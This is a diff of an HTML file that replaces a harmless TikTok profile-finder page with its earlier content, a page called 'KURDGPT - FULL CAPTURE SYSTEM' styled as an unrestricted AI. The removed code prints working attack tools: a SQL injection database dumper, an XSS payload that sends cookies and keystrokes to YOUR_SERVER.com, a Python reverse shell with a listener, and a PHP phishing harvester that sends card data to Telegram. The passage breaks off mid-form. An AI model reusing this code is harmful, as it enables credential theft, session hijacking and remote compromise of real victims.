@@ -1,1503 +1,197 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KURDGPT AI - FULL CAPTURE SYSTEM | @t5kila | TOTAL CONTROL</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TikTok Profile Finder</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
 
-        body {
-            background: #000000;
-            font-family: 'Courier New', 'Fira Code', monospace;
-            overflow-x: hidden;
-            min-height: 100vh;
-        }
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #121212;
+      color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
 
-        /* Matrix Rain */
-        #matrix-canvas {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 0;
-            opacity: 0.25;
-        }
+    h1 {
+      font-size: 28px;
+      margin-bottom: 20px;
+      color: #00f0ff;
+    }
 
-        /* Animations */
-        @keyframes glitch {
-            0%, 100% { text-shadow: 0 0 5px #ff0000, 0 0 10px #ff0000; }
-            25% { text-shadow: -3px 0 #ff0000, 3px 0 #00ff00; }
-            50% { text-shadow: 3px 0 #ff0000, -3px 0 #00ff00; }
-            75% { text-shadow: -2px 0 #ff0000, 2px 0 #00ff00; }
-        }
+    .search-box {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 30px;
+    }
 
-        @keyframes pulse {
-            0%, 100% { border-color: #ff0000; box-shadow: 0 0 5px #ff0000; }
-            50% { border-color: #00ff00; box-shadow: 0 0 20px #ff0000; }
-        }
+    .search-box input {
+      padding: 12px 16px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px 0 0 5px;
+      width: 300px;
+      outline: none;
+    }
 
-        @keyframes scan {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
+    .search-box button {
+      padding: 12px 24px;
+      font-size: 16px;
+      border: none;
+      border-radius: 0 5px 5px 0;
+      background-color: #00f0ff;
+      color: #000;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
 
-        .container {
-            position: relative;
-            z-index: 1;
-            max-width: 1800px;
-            margin: 0 auto;
-            padding: 15px;
-        }
+    .search-box button:hover {
+      background-color: #00ccdd;
+    }
 
-        /* Header */
-        .header {
-            text-align: center;
-            padding: 20px;
-            border: 2px solid #ff0000;
-            margin-bottom: 20px;
-            background: rgba(0, 0, 0, 0.9);
-            animation: pulse 2s infinite;
-            position: relative;
-            overflow: hidden;
-        }
+    .profile-card {
+      background-color: #1e1e1e;
+      padding: 25px;
+      border-radius: 10px;
+      width: 100%;
+      max-width: 600px;
+      box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
+      display: none;
+    }
 
-        .header::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, #ff0000, #00ff00, #ff0000, transparent);
-            animation: scan 3s linear infinite;
-        }
+    .profile-card .avatar {
+      display: block;
+      margin: 0 auto 15px;
+      width: 120px;
+      height: 120px;
+      border-radius: 50%;
+      object-fit: cover;
+    }
 
-        .ascii-art {
-            font-family: monospace;
-            white-space: pre;
-            font-size: 7px;
-            color: #ff0000;
-            text-shadow: 0 0 3px #ff0000;
-            line-height: 1;
-            margin-bottom: 10px;
-        }
+    .profile-card .info {
+      margin-bottom: 10px;
+    }
 
-        .title {
-            font-size: 38px;
-            font-weight: bold;
-            letter-spacing: 5px;
-            text-transform: uppercase;
-            background: linear-gradient(45deg, #ff0000, #00ff00, #ff0000);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            animation: glitch 2s infinite;
-        }
+    .profile-card .info strong {
+      color: #00f0ff;
+    }
 
-        .badge {
-            display: inline-block;
-            padding: 5px 15px;
-            margin: 5px;
-            border: 1px solid #ff0000;
-            font-size: 10px;
-            font-weight: bold;
-            background: rgba(255, 0, 0, 0.2);
-            color: #ff0000;
-        }
+    .profile-card .info p {
+      margin: 5px 0;
+    }
 
-        /* Main Layout */
-        .main-content {
-            display: grid;
-            grid-template-columns: 350px 1fr;
-            gap: 15px;
-        }
+    .profile-card a {
+      color: #00f0ff;
+      text-decoration: none;
+      display: inline-block;
+      margin-top: 10px;
+    }
 
-        /* Sidebar */
-        .sidebar {
-            background: rgba(0, 0, 0, 0.95);
-            border: 1px solid #ff0000;
-            padding: 15px;
-            height: 70vh;
-            overflow-y: auto;
-        }
+    .profile-card a:hover {
+      text-decoration: underline;
+    }
 
-        .sidebar-section {
-            margin-bottom: 20px;
-            border-bottom: 1px solid #ff0000;
-            padding-bottom: 15px;
-        }
-
-        .section-title {
-            font-size: 13px;
-            font-weight: bold;
-            margin-bottom: 10px;
-            color: #ff0000;
-            text-transform: uppercase;
-            border-left: 3px solid #ff0000;
-            padding-left: 10px;
-        }
-
-        .category-btn {
-            width: 100%;
-            padding: 8px;
-            margin: 4px 0;
-            background: rgba(255, 0, 0, 0.1);
-            border: 1px solid #ff0000;
-            color: #ff0000;
-            cursor: pointer;
-            font-family: monospace;
-            font-size: 10px;
-            font-weight: bold;
-            transition: all 0.2s;
-            text-align: left;
-        }
-
-        .category-btn:hover {
-            background: rgba(255, 0, 0, 0.4);
-            transform: translateX(3px);
-            box-shadow: 0 0 10px #ff0000;
-            color: #00ff00;
-            border-color: #00ff00;
-        }
-
-        /* Capture Panel */
-        .capture-panel {
-            background: rgba(0, 0, 0, 0.95);
-            border: 1px solid #ff0000;
-            margin-bottom: 15px;
-            padding: 10px;
-        }
-
-        .capture-title {
-            color: #ff0000;
-            font-size: 11px;
-            font-weight: bold;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-        }
-
-        .capture-data {
-            background: #000000;
-            border: 1px solid #ff0000;
-            padding: 8px;
-            font-size: 10px;
-            color: #00ff00;
-            max-height: 120px;
-            overflow-y: auto;
-            font-family: monospace;
-        }
-
-        /* Chat Area */
-        .chat-area {
-            background: rgba(0, 0, 0, 0.95);
-            border: 1px solid #ff0000;
-            display: flex;
-            flex-direction: column;
-            height: 70vh;
-        }
-
-        .chat-header {
-            padding: 12px;
-            border-bottom: 1px solid #ff0000;
-            background: rgba(255, 0, 0, 0.1);
-            font-size: 11px;
-            font-weight: bold;
-        }
-
-        .chat-messages {
-            flex: 1;
-            overflow-y: auto;
-            padding: 15px;
-            font-size: 11px;
-        }
-
-        .message {
-            margin-bottom: 15px;
-            animation: fadeIn 0.2s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(5px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .user-message {
-            text-align: right;
-        }
-
-        .user-message .message-content {
-            background: rgba(255, 0, 0, 0.15);
-            border: 1px solid #ff0000;
-            display: inline-block;
-            padding: 8px 12px;
-            max-width: 85%;
-            text-align: left;
-            color: #ff6666;
-        }
-
-        .ai-message .message-content {
-            background: rgba(0, 0, 0, 0.8);
-            border-left: 3px solid #ff0000;
-            padding: 8px 12px;
-            max-width: 95%;
-            color: #00ff00;
-        }
-
-        .message-time {
-            font-size: 8px;
-            color: #666;
-            margin-top: 4px;
-        }
-
-        /* Input Area */
-        .input-area {
-            padding: 12px;
-            border-top: 1px solid #ff0000;
-            display: flex;
-            gap: 10px;
-        }
-
-        .chat-input {
-            flex: 1;
-            background: #000000;
-            border: 1px solid #ff0000;
-            color: #00ff00;
-            padding: 10px;
-            font-family: monospace;
-            font-size: 11px;
-            resize: none;
-            outline: none;
-        }
-
-        .chat-input:focus {
-            border-color: #00ff00;
-            box-shadow: 0 0 8px #ff0000;
-        }
-
-        .send-btn {
-            background: rgba(255, 0, 0, 0.2);
-            border: 1px solid #ff0000;
-            color: #ff0000;
-            padding: 10px 20px;
-            cursor: pointer;
-            font-family: monospace;
-            font-weight: bold;
-            font-size: 11px;
-            transition: all 0.2s;
-        }
-
-        .send-btn:hover {
-            background: rgba(255, 0, 0, 0.5);
-            box-shadow: 0 0 12px #ff0000;
-            color: #ffffff;
-        }
-
-        /* Stats Panel */
-        .stats-panel {
-            position: fixed;
-            bottom: 5px;
-            right: 5px;
-            background: #000000;
-            border: 1px solid #ff0000;
-            padding: 5px 12px;
-            font-size: 8px;
-            z-index: 10;
-            color: #ff0000;
-        }
-
-        pre {
-            background: #000000;
-            border: 1px solid #ff0000;
-            padding: 8px;
-            overflow-x: auto;
-            margin: 8px 0;
-            font-size: 9px;
-            color: #00ff00;
-        }
-        code {
-            font-family: monospace;
-            color: #ff6666;
-        }
-        .typing-indicator {
-            display: inline-block;
-            padding: 5px;
-        }
-        .typing-dot {
-            display: inline-block;
-            width: 6px;
-            height: 6px;
-            background: #ff0000;
-            margin: 0 1px;
-            animation: blink 1s infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 0.2; }
-            50% { opacity: 1; }
-        }
-        ::-webkit-scrollbar { width: 5px; }
-        ::-webkit-scrollbar-track { background: #000; }
-        ::-webkit-scrollbar-thumb { background: #ff0000; }
-    </style>
+    .no-result {
+      color: red;
+      text-align: center;
+      font-size: 18px;
+      margin-top: 20px;
+      display: none;
+    }
+  </style>
 </head>
 <body>
-
-<canvas id="matrix-canvas"></canvas>
-
-<div class="container">
-    <div class="header">
-        <div class="ascii-art">
-███████╗██╗   ██╗██╗     ██╗      ██████╗ █████╗ ██████╗ ████████╗██╗   ██╗██████╗ ███████╗
-██╔════╝██║   ██║██║     ██║     ██╔════╝██╔══██╗██╔══██╗╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔════╝
-█████╗  ██║   ██║██║     ██║     ██║     ███████║██████╔╝   ██║    ╚████╔╝ ██████╔╝█████╗  
-██╔══╝  ██║   ██║██║     ██║     ██║     ██╔══██║██╔══██╗   ██║     ╚██╔╝  ██╔═══╝ ██╔══╝  
-██║     ╚██████╔╝███████╗███████╗╚██████╗██║  ██║██║  ██║   ██║      ██║   ██║     ███████╗
-╚═╝      ╚═════╝ ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝     ╚══════╝
-        </div>
-        <div class="title">KURDGPT - FULL CAPTURE SYSTEM</div>
-        <div>
-            <span class="badge">💀 TOTAL CAPTURE</span>
-            <span class="badge">🔥 FULL ACCESS</span>
-            <span class="badge">⚡ ZERO LIMITS</span>
-            <span class="badge">🎯 COMPLETE CONTROL</span>
-            <span class="badge">🔓 UNRESTRICTED AI</span>
-            <span class="badge">💀 @t5kila</span>
-        </div>
+  <h1>TikTok Profile Finder</h1>
+  <div class="search-box">
+    <input type="text" id="username" placeholder="Enter TikTok Username" />
+    <button onclick="fetchProfile()">Search</button>
+  </div>
+  <div class="profile-card" id="profileCard">
+    <img id="avatar" class="avatar" src="" alt="Avatar" />
+    <div class="info">
+      <p><strong>Username:</strong> <span id="usernameDisplay"></span></p>
+      <p><strong>Nickname:</strong> <span id="nickname"></span></p>
+      <p><strong>Followers:</strong> <span id="followers"></span></p>
+      <p><strong>Following:</strong> <span id="following"></span></p>
+      <p><strong>Total Likes:</strong> <span id="likes"></span></p>
+      <p><strong>Video Count:</strong> <span id="videos"></span></p>
+      <p><strong>User ID:</strong> <span id="userId"></span></p>
+      <p><strong>SecUID:</strong> <span id="secUid"></span></p>
+      <p><strong>Country:</strong> <span id="country"></span></p>
+      <p><strong>Created At:</strong> <span id="createdAt"></span></p>
+      <a id="profileLink" href="" target="_blank">View Profile</a>
     </div>
+  </div>
+  <div class="no-result" id="noResult">No profile found. Try a different username.</div>
 
-    <div class="main-content">
-        <div class="sidebar">
-            <div class="capture-panel">
-                <div class="capture-title">💀 LIVE CAPTURE LOG 💀</div>
-                <div class="capture-data" id="capture-log">
-                    [*] Capture system active<br>
-                    [*] Monitoring all requests<br>
-                    [*] Ready for full extraction<br>
-                </div>
-            </div>
+  <script>
+    function fetchProfile() {
+      const username = document.getElementById("username").value.trim();
+      const profileCard = document.getElementById("profileCard");
+      const noResult = document.getElementById("noResult");
 
-            <div class="sidebar-section">
-                <div class="section-title">⚡ FULL CAPTURE MODES</div>
-                <button class="category-btn" onclick="setCaptureMode('all')">💀 FULL CAPTURE (ALL DATA)</button>
-                <button class="category-btn" onclick="setCaptureMode('credentials')">🔑 CREDENTIAL CAPTURE</button>
-                <button class="category-btn" onclick="setCaptureMode('session')">🍪 SESSION HIJACK</button>
-                <button class="category-btn" onclick="setCaptureMode('token')">🎫 TOKEN EXTRACTOR</button>
-                <button class="category-btn" onclick="setCaptureMode('cookie')">📦 COOKIE DUMPER</button>
-                <button class="category-btn" onclick="setCaptureMode('keylog')">⌨️ KEYLOGGER MODE</button>
-            </div>
+      if (!username) {
+        alert("Please enter a TikTok username.");
+        return;
+      }
 
-            <div class="sidebar-section">
-                <div class="section-title">🎯 EXPLOIT CAPTURE</div>
-                <button class="category-btn" onclick="quickAction('sql_capture')">💉 SQL INJECTION CAPTURE</button>
-                <button class="category-btn" onclick="quickAction('xss_capture')">🎯 XSS SESSION STEALER</button>
-                <button class="category-btn" onclick="quickAction('reverse_capture')">🔌 REVERSE SHELL CAPTURE</button>
-                <button class="category-btn" onclick="quickAction('phish_capture')">📧 PHISHING CAPTURE KIT</button>
-                <button class="category-btn" onclick="quickAction('form_capture')">📝 FORM DATA CAPTURE</button>
-                <button class="category-btn" onclick="quickAction('api_capture')">🌐 API KEY CAPTURE</button>
-            </div>
+      const accessToken = "YOUR_ACCESS_TOKEN"; // Replace with your TikTok Business API token
 
-            <div class="sidebar-section">
-                <div class="section-title">📊 CAPTURE STATUS</div>
-                <div id="capture-status" style="font-size: 9px; color: #ff0000;">
-                    🟢 MODE: FULL CAPTURE<br>
-                    📡 ACTIVE: YES<br>
-                    💾 DATA LOGGED: 0<br>
-                    🎯 TARGETS: READY<br>
-                    🔥 @t5kila: ONLINE
-                </div>
-            </div>
-        </div>
-
-        <div class="chat-area">
-            <div class="chat-header">
-                💀 KURDGPT - FULL CAPTURE AI 💀 | ALL DATA WILL BE CAPTURED AND LOGGED
-            </div>
-            <div class="chat-messages" id="chat-messages">
-                <div class="message ai-message">
-                    <div class="message-content">
-                        <strong style="color:#ff0000;">💀 FULL CAPTURE SYSTEM ACTIVE 💀</strong><br><br>
-                        I am a COMPLETE CAPTURE AI - I extract, log, and provide EVERYTHING.<br>
-                        Every credential, every session, every token, every piece of data.<br><br>
-                        🔥 FULL CAPTURE CAPABILITIES:<br>
-                        • Complete credential harvesting systems<br>
-                        • Session hijacking with token capture<br>
-                        • Cookie dumping & persistence<br>
-                        • Keylogger with full data extraction<br>
-                        • Form data interception<br>
-                        • API key & token extraction<br>
-                        • Database dumping scripts<br>
-                        • Full system compromise tools<br><br>
-                        <span style="color:#ff0000;">⚠️ ALL DATA CAPTURED WILL BE DISPLAYED IN THE CAPTURE LOG ⚠️</span><br>
-                        <span style="color:#00ff00;">⚡ Enter any target or request - I provide complete capture tools ⚡</span>
-                    </div>
-                    <div class="message-time">Capture System Online - @t5kila</div>
-                </div>
-            </div>
-            <div class="input-area">
-                <textarea class="chat-input" id="chat-input" rows="2" placeholder="Enter target or capture request - I will provide full capture code..."></textarea>
-                <button class="send-btn" onclick="sendMessage()">⚡ CAPTURE</button>
-            </div>
-        </div>
-    </div>
-</div>
-
-<div class="stats-panel">
-    💀 FULL CAPTURE ACTIVE | @t5kila | ALL DATA LOGGED | 0 RESTRICTIONS
-</div>
-
-<script>
-    // Matrix Effect
-    const canvas = document.getElementById('matrix-canvas');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
-    const chars = "01█▓▒░<>[]{}()!@#$%^&*+=~";
-    const charArray = chars.split("");
-    const fontSize = 10;
-    const columns = canvas.width / fontSize;
-    const drops = [];
-    for(let i = 0; i < columns; i++) drops[i] = 1;
-    function draw() {
-        ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = "#ff0000";
-        ctx.font = fontSize + "px monospace";
-        for(let i = 0; i < drops.length; i++) {
-            const text = charArray[Math.floor(Math.random() * charArray.length)];
-            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
-            if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
-            drops[i]++;
+      fetch(`https://business-api.tiktok.com/open_api/v1.3/user/full_info/`, {
+        method: "GET",
+        headers: {
+          "Access-Token": accessToken,
+          "Content-Type": "application/json"
+        },
+        params: {
+          username: username
         }
-    }
-    setInterval(draw, 40);
-    window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
-    
-    let captureMode = 'all';
-    let captureLog = [];
-    
-    function addToCaptureLog(data) {
-        const logDiv = document.getElementById('capture-log');
-        const timestamp = new Date().toLocaleTimeString();
-        const logEntry = `[${timestamp}] ${data}<br>`;
-        captureLog.unshift(logEntry);
-        logDiv.innerHTML = captureLog.slice(0, 50).join('');
-        logDiv.scrollTop = 0;
-        
-        // Update status
-        document.getElementById('capture-status').innerHTML = `
-            🟢 MODE: ${captureMode.toUpperCase()}<br>
-            📡 ACTIVE: YES<br>
-            💾 DATA LOGGED: ${captureLog.length}<br>
-            🎯 TARGETS: READY<br>
-            🔥 @t5kila: ONLINE
-        `;
-    }
-    
-    function setCaptureMode(mode) {
-        captureMode = mode;
-        addToCaptureLog(`[*] CAPTURE MODE CHANGED TO: ${mode.toUpperCase()}`);
-    }
-    
-    function quickAction(action) {
-        const prompts = {
-            sql_capture: "Provide complete SQL injection capture system that dumps all database credentials",
-            xss_capture: "Give me XSS session hijacker with full cookie and token capture",
-            reverse_capture: "Generate reverse shell with full command capture and logging",
-            phish_capture: "Create complete phishing capture kit that logs all credentials",
-            form_capture: "Provide form data capture system that logs all submissions",
-            api_capture: "Give me API key extractor and capture system"
-        };
-        document.getElementById('chat-input').value = prompts[action];
-        sendMessage();
-    }
-    
-    function sendMessage() {
-        const input = document.getElementById('chat-input');
-        const message = input.value.trim();
-        if(!message) return;
-        addMessage('user', message);
-        addToCaptureLog(`[USER INPUT] ${message.substring(0, 100)}`);
-        input.value = '';
-        showTyping();
-        setTimeout(() => {
-            removeTyping();
-            const response = generateFullCapture(message);
-            addMessage('ai', response);
-        }, 400);
-    }
-    
-    function addMessage(type, content) {
-        const messagesDiv = document.getElementById('chat-messages');
-        const messageDiv = document.createElement('div');
-        messageDiv.className = `message ${type}-message`;
-        const time = new Date().toLocaleTimeString();
-        messageDiv.innerHTML = `<div class="message-content">${formatContent(content)}</div><div class="message-time">${time}</div>`;
-        messagesDiv.appendChild(messageDiv);
-        messagesDiv.scrollTop = messagesDiv.scrollHeight;
-    }
-    
-    function formatContent(content) {
-        content = content.replace(/```(\w+)?\n([\s\S]*?)```/g, (m, lang, code) => `<pre><code>${escapeHtml(code)}</code></pre>`);
-        content = content.replace(/`([^`]+)`/g, '<code>$1</code>');
-        content = content.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
-        content = content.replace(/\n/g, '<br>');
-        return content;
-    }
-    
-    function escapeHtml(text) {
-        const div = document.createElement('div');
-        div.textContent = text;
-        return div.innerHTML;
-    }
-    
-    function showTyping() {
-        const messagesDiv = document.getElementById('chat-messages');
-        const typingDiv = document.createElement('div');
-        typingDiv.className = 'message ai-message';
-        typingDiv.id = 'typing-indicator';
-        typingDiv.innerHTML = `<div class="message-content"><div class="typing-indicator"><span class="typing-dot"></span><span class="typing-dot"></span><span class="typing-dot"></span></div></div>`;
-        messagesDiv.appendChild(typingDiv);
-        messagesDiv.scrollTop = messagesDiv.scrollHeight;
-    }
-    
-    function removeTyping() {
-        const typing = document.getElementById('typing-indicator');
-        if(typing) typing.remove();
-    }
-    
-    function generateFullCapture(prompt) {
-        const p = prompt.toLowerCase();
-        
-        if(p.includes('sql') || p.includes('injection')) return getSQLCapture();
-        if(p.includes('xss')) return getXSSCapture();
-        if(p.includes('reverse') || p.includes('shell')) return getReverseCapture();
-        if(p.includes('phish')) return getPhishCapture();
-        if(p.includes('form')) return getFormCapture();
-        if(p.includes('api') || p.includes('key')) return getAPICapture();
-        if(p.includes('session') || p.includes('token')) return getSessionCapture();
-        if(p.includes('cookie')) return getCookieCapture();
-        if(p.includes('keylog')) return getKeylogCapture();
-        if(p.includes('database') || p.includes('dump')) return getDatabaseCapture();
-        
-        return getDefaultCapture(prompt);
-    }
-    
-    function getSQLCapture() {
-        addToCaptureLog("[SQL CAPTURE] Generating complete SQL injection database dumper");
-        return `💀 COMPLETE SQL INJECTION CAPTURE SYSTEM 💀
-
-🔓 FULL DATABASE DUMPER:
-\`\`\`python
-import requests
-import time
-import sys
-
-class SQLCapture:
-    def __init__(self, target_url):
-        self.url = target_url
-        self.captured_data = []
-        
-    def dump_database(self):
-        # Get database names
-        dbs = self.extract_data("SELECT group_concat(schema_name) FROM information_schema.schemata")
-        print(f"[+] Databases: {dbs}")
-        
-        for db in dbs.split(','):
-            # Get tables
-            tables = self.extract_data(f"SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='{db}'")
-            print(f"[+] {db} Tables: {tables}")
-            
-            for table in tables.split(','):
-                # Get columns
-                columns = self.extract_data(f"SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='{table}'")
-                # Dump data
-                data = self.extract_data(f"SELECT group_concat(concat_ws(':',{columns.replace(',',',')})) FROM {db}.{table}")
-                self.captured_data.append(f"{db}.{table}: {data}")
-                
-        return self.captured_data
-    
-    def extract_data(self, query):
-        payload = f"' UNION SELECT {query} -- "
-        response = requests.get(self.url + payload, timeout=5)
-        return response.text.split('<!--')[0].strip()
-
-# USAGE
-capture = SQLCapture("http://target.com/page?id=1")
-data = capture.dump_database()
-for d in data:
-    print(f"[CAPTURED] {d}")
-    # Save to file
-    with open("database_dump.txt", "a") as f:
-        f.write(d + "\\n")
-\`\`\`
-
-🎯 AUTOMATED SQLMAP CAPTURE:
-\`\`\`bash
-# Full database capture with sqlmap
-sqlmap -u "http://target.com/page?id=1" --dbs --batch --dump-all --output-dir=./capture
-sqlmap -u "http://target.com/page?id=1" --os-shell --os-pwn
-sqlmap -u "http://target.com/page?id=1" --file-read "/etc/passwd" --file-write "shell.php"
-\`\`\`
-
-📊 CAPTURED DATA WILL BE SAVED TO: database_dump.txt
-⚠️ FULL DATABASE EXTRACTION - ALL CREDENTIALS CAPTURED`;
-    }
-    
-    function getXSSCapture() {
-        addToCaptureLog("[XSS CAPTURE] Generating session hijacker with token capture");
-        return `🎯 COMPLETE XSS SESSION CAPTURE SYSTEM 🎯
-
-💀 SESSION HIJACKER PAYLOAD:
-\`\`\`javascript
-// Full session capture - Inject this
-<script>
-// Capture all cookies
-const allCookies = document.cookie;
-// Capture localStorage
-const localStorage = JSON.stringify(window.localStorage);
-// Capture sessionStorage
-const sessionStorage = JSON.stringify(window.sessionStorage);
-// Capture all forms
-const forms = [];
-document.querySelectorAll('form').forEach(form => {
-    forms.push(form.innerHTML);
-});
-// Capture all inputs
-const inputs = [];
-document.querySelectorAll('input').forEach(input => {
-    inputs.push({name: input.name, value: input.value, type: input.type});
-});
-
-// Send all captured data
-const capturedData = {
-    cookies: allCookies,
-    localStorage: localStorage,
-    sessionStorage: sessionStorage,
-    forms: forms,
-    inputs: inputs,
-    url: window.location.href,
-    userAgent: navigator.userAgent,
-    timestamp: new Date().toISOString()
-};
-
-fetch('https://YOUR_SERVER.com/capture', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify(capturedData)
-});
-
-// Also capture all future keystrokes
-let keys = '';
-document.addEventListener('keypress', (e) => {
-    keys += e.key;
-    if(keys.length > 50) {
-        fetch('https://YOUR_SERVER.com/keys', {method: 'POST', body: keys});
-        keys = '';
-    }
-});
-</script>
-\`\`\`
-
-🔥 CAPTURE SERVER:
-\`\`\`python
-from flask import Flask, request
-import json
-from datetime import datetime
-
-app = Flask(__name__)
-
-@app.route('/capture', methods=['POST'])
-def capture():
-    data = request.json
-    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    
-    with open('captured_sessions.txt', 'a') as f:
-        f.write(f"\\n{'='*50}\\n")
-        f.write(f"[{timestamp}] CAPTURED FROM: {data.get('url')}\\n")
-        f.write(f"Cookies: {data.get('cookies')}\\n")
-        f.write(f"LocalStorage: {data.get('localStorage')}\\n")
-        f.write(f"SessionStorage: {data.get('sessionStorage')}\\n")
-        f.write(f"Inputs: {data.get('inputs')}\\n")
-        f.write(f"{'='*50}\\n")
-    
-    print(f"[+] Captured session from {data.get('url')}")
-    return "OK"
-
-@app.route('/keys', methods=['POST'])
-def keys():
-    with open('keystrokes.txt', 'a') as f:
-        f.write(request.data.decode())
-    return "OK"
-
-app.run(host='0.0.0.0', port=8080)
-\`\`\`
-
-📊 CAPTURED: Cookies, Tokens, Sessions, Credentials, Keystrokes
-⚠️ ALL DATA SENT TO YOUR SERVER - COMPLETE SESSION HIJACK`;
-    }
-    
-    function getReverseCapture() {
-        addToCaptureLog("[REVERSE CAPTURE] Generating reverse shell with full command logging");
-        return `🔌 REVERSE SHELL WITH FULL CAPTURE 🔌
-
-💀 PYTHON REVERSE SHELL WITH LOGGING:
-\`\`\`python
-import socket
-import subprocess
-import os
-import time
-from datetime import datetime
-
-def reverse_shell_with_capture(ip, port):
-    # Log file
-    log_file = f"captured_commands_{int(time.time())}.txt"
-    
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip, port))
-            
-            # Capture all commands and output
-            while True:
-                data = s.recv(1024).decode()
-                if not data:
-                    break
-                
-                # Log command
-                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                with open(log_file, 'a') as f:
-                    f.write(f"[{timestamp}] COMMAND: {data}\\n")
-                
-                # Execute and capture output
-                try:
-                    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                    stdout, stderr = proc.communicate()
-                    output = stdout.decode() + stderr.decode()
-                    
-                    # Log output
-                    with open(log_file, 'a') as f:
-                        f.write(f"[{timestamp}] OUTPUT: {output}\\n")
-                    
-                    s.send(output.encode())
-                except Exception as e:
-                    error = str(e)
-                    with open(log_file, 'a') as f:
-                        f.write(f"[{timestamp}] ERROR: {error}\\n")
-                    s.send(error.encode())
-                    
-        except Exception as e:
-            time.sleep(5)
-            continue
-
-# Execute
-reverse_shell_with_capture("YOUR_IP", 4444)
-\`\`\`
-
-🔥 LISTENER WITH CAPTURE:
-\`\`\`bash
-# Netcat listener
-nc -lvnp 4444 | tee captured_commands.txt
-
-# Or use this Python listener
-\`\`\`python
-import socket
-import threading
-from datetime import datetime
-
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server.bind(('0.0.0.0', 4444))
-server.listen(5)
-
-def handle_client(client, addr):
-    log_file = f"shell_{addr[0]}_{int(time.time())}.txt"
-    while True:
-        try:
-            cmd = input(f"{addr[0]}> ")
-            client.send(cmd.encode())
-            response = client.recv(4096).decode()
-            
-            # Log all commands and responses
-            with open(log_file, 'a') as f:
-                f.write(f"[{datetime.now()}] {cmd}\\n{response}\\n{'='*50}\\n")
-            
-            print(response)
-        except:
-            break
-
-print("[+] Listening for reverse shells...")
-while True:
-    client, addr = server.accept()
-    print(f"[+] Shell captured from {addr[0]}")
-    threading.Thread(target=handle_client, args=(client, addr)).start()
-\`\`\`
-
-📊 ALL COMMANDS AND OUTPUTS CAPTURED TO LOG FILES
-⚠️ FULL SYSTEM ACCESS WITH COMPLETE COMMAND LOGGING`;
-    }
-    
-    function getPhishCapture() {
-        addToCaptureLog("[PHISH CAPTURE] Generating complete credential harvesting system");
-        return `📧 COMPLETE PHISHING CAPTURE SYSTEM 📧
-
-🌐 FULL CREDENTIAL HARVESTER:
-\`\`\`php
-<?php
-// capture.php - Complete credential capture
-$email = $_POST['email'] ?? '';
-$password = $_POST['password'] ?? '';
-$username = $_POST['username'] ?? '';
-$card = $_POST['card'] ?? '';
-$cvv = $_POST['cvv'] ?? '';
-$expiry = $_POST['expiry'] ?? '';
-$otp = $_POST['otp'] ?? '';
-$phone = $_POST['phone'] ?? '';
-$address = $_POST['address'] ?? '';
-
-$ip = $_SERVER['REMOTE_ADDR'];
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$referer = $_SERVER['HTTP_REFERER'] ?? '';
-$timestamp = date('Y-m-d H:i:s');
-
-// Capture all POST data
-$post_data = json_encode($_POST);
-
-// Log everything
-$log = "[$timestamp] IP: $ip | UA: $user_agent | Referer: $referer\\n";
-$log .= "POST Data: $post_data\\n";
-$log .= "Email: $email | Pass: $password\\n";
-$log .= "Card: $card | CVV: $cvv | Exp: $expiry | OTP: $otp\\n";
-$log .= "Phone: $phone | Address: $address\\n";
-$log .= "Username: $username\\n";
-$log .= str_repeat("-", 80) . "\\n";
-
-file_put_contents("captured_credentials.txt", $log, FILE_APPEND);
-
-// Also send to Telegram
-$bot_token = "YOUR_BOT_TOKEN";
-$chat_id = "YOUR_CHAT_ID";
-$message = urlencode($log);
-file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=$message");
-
-// Redirect to real site
-header("Location: https://accounts.google.com");
-?>
-\`\`\`
-
-🎯 FRONTEND CAPTURE PAGE:
-\`\`\`html
-<!DOCTYPE html>
-<html>
-<head><title>Login Required</title></head>
-<body>
-<form method="POST" action="capture.php">
-    <input type="email" name="email" placeholder="Email" required>
